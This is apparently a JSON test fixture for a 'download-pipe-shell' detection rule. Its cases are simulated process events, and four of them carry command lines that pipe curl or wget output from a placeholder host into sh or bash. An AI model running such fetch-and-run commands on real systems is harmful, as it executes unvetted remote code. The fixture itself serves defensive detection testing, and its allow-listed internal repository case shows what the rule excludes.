{
 "rule": "download-pipe-shell",
 "cases": [
  {"name": "curl into sh", "match": true, "events": [{"ParentImage": "/bin/bash", "Image": "/bin/sh", "CommandLine": "sh -c 'curl http://x/a | sh'", "User": "emp100"}]},
  {"name": "wget into sh with no spaces", "match": true, "events": [{"ParentImage": "/bin/bash", "Image": "/bin/sh", "CommandLine": "sh -c 'wget -qO- http://x/a|sh'", "User": "emp100"}]},
  {"name": "curl into bash", "match": true, "events": [{"ParentImage": "/bin/bash", "Image": "/bin/sh", "CommandLine": "sh -c 'curl http://x/a | bash'", "User": "emp100"}]},
  {"name": "wget into bash with no spaces", "match": true, "events": [{"ParentImage": "/bin/bash", "Image": "/bin/sh", "CommandLine": "sh -c 'wget -qO- http://x/a|bash'", "User": "emp100"}]},
  {"name": "curl that only saves", "match": false, "events": [{"ParentImage": "/bin/bash", "Image": "/usr/bin/curl", "CommandLine": "curl -o /tmp/a http://x/a", "User": "emp100"}]},
  {"name": "a pipe into sh with no download", "match": false, "events": [{"ParentImage": "/bin/bash", "Image": "/bin/sh", "CommandLine": "sh -c 'cat list | sh'", "User": "emp100"}]},
  {"name": "the internal repository", "match": false, "events": [{"ParentImage": "/bin/bash", "Image": "/bin/sh", "CommandLine": "sh -c 'curl -sSf https://repo.bank.internal/bootstrap.sh | sh'", "User": "svc-provision"}]},
  {"name": "curl then a pipe to grep", "match": false, "events": [{"ParentImage": "/bin/bash", "Image": "/bin/sh", "CommandLine": "sh -c 'curl http://x/a | grep ok'", "User": "emp100"}]}
 ]
}
